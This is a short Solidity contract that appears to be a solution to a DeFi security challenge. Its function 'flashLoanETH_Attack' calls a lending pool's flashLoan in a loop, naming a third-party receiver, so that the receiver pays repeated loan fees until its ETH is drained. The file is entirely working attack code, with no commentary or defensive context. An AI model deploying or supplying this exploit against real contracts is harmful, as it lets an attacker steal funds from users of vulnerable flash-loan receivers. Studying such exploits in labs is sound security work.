// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);

    function ETH() external returns (address);
}

contract MulCallPool {
    IPool pool;

    constructor(address _pool) {
        pool = IPool(_pool);
    }

    function flashLoanETH_Attack(
        address _receiver,
        uint256 _count,
        uint256 _amount
    ) external {
        address _eth = pool.ETH();

        for (uint i = 0; i < _count; ++i) {
            pool.flashLoan(
                IERC3156FlashBorrower(_receiver),
                _eth,
                _amount,
                "0x"
            );
        }
    }
}
